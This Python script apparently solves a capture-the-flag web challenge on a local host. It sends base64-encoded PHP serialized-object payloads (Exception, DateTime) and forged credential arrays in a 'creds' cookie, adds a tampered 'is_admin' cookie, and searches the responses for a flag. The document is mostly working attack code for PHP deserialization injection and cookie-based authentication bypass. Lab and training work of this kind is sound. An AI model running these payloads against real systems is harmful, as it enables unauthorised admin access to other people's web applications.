import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# Check Exception response
print("[*] Full response for Exception injection...\n")

payload = 'O:9:"Exception":1:{s:7:"message";s:5:"admin";}'
payload_b64 = base64.b64encode(payload.encode()).decode()

headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
resp = requests.get(base_url, headers=headers)

print(f"Payload: {payload}")
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.content)}B")

# Extract error and content
error_match = re.search(r'(<br /><b>.*?</b>.*?)</body>', resp.text, re.DOTALL)
if error_match:
    print(f"\n[+] Error/Content section:\n{error_match.group(1)}")

print("\n" + "="*80 + "\n")

# Check DateTime response
print("[*] Full response for DateTime injection...\n")

payload2 = 'O:8:"DateTime":0:{}'
payload2_b64 = base64.b64encode(payload2.encode()).decode()

headers2 = {'Cookie': f'creds={payload2_b64}; is_admin=1'}
resp2 = requests.get(base_url, headers=headers2)

print(f"Payload: {payload2}")
print(f"Status: {resp2.status_code}")
print(f"Length: {len(resp2.content)}B")

error_match2 = re.search(r'(<br /><b>.*?</b>.*?)</body>', resp2.text, re.DOTALL)
if error_match2:
    print(f"\n[+] Error/Content section:\n{error_match2.group(1)}")

print("\n" + "="*80 + "\n")

# The context says setting is_admin=1 removes rejection message
# Let me verify this finding - compare with and without is_admin cookie
print("[*] Verifying is_admin cookie effect...\n")

# Normal array WITH is_admin=1
normal_payload = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'
normal_b64 = base64.b64encode(normal_payload.encode()).decode()

resp_with = requests.get(base_url, headers={'Cookie': f'creds={normal_b64}; is_admin=1'})
resp_without = requests.get(base_url, headers={'Cookie': f'creds={normal_b64}'})

print(f"Normal array WITH is_admin=1: {len(resp_with.content)}B")
print(f"Normal array WITHOUT is_admin: {len(resp_without.content)}B")
print(f"Difference: {len(resp_with.content) - len(resp_without.content):+d}B")

# Check content difference
content_with = re.search(r'</form>(.*?)</body>', resp_with.text, re.DOTALL)
content_without = re.search(r'</form>(.*?)</body>', resp_without.text, re.DOTALL)

if content_with and content_without:
    print(f"\n[+] WITH is_admin=1:\n{content_with.group(1).strip()}")
    print(f"\n[+] WITHOUT is_admin:\n{content_without.group(1).strip()}")

# Now the key question - where is the flag displayed?
# Let's try to find where admin content would be shown
print("\n" + "="*80 + "\n")
print("[*] Testing various combinations to trigger flag display...\n")

# Maybe the flag appears in a specific location or needs specific conditions
combinations = [
    ('admin+is_admin', 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}', 'is_admin=1'),
    ('Burns+is_admin', 'a:2:{s:8:"username";s:5:"Burns";s:8:"password";s:5:"Burns";}', 'is_admin=1'),
    ('admin+is_admin=2', 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}', 'is_admin=2'),
    ('admin+is_admin=true', 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}', 'is_admin=true'),
    ('admin+is_admin=yes', 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}', 'is_admin=yes'),
]

for name, payload, extra_cookie in combinations:
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; {extra_cookie}'}
    resp = requests.get(base_url, headers=headers)
    
    print(f"    {name}: {len(resp.content)}B")
    
    # Check for flag
    if "FLAG" in resp.text or "flag{" in resp.text.lower():
        print(f"        [!!!] FLAG FOUND!")
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"        FLAG: {flag_match.group(1)}")
    
    # Check for differences
    if "you are not the admin" not in resp.text:
        print(f"        [+] No rejection message")
        content = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
        if content:
            print(f"        Content: {content.group(1).strip()[:200]}")

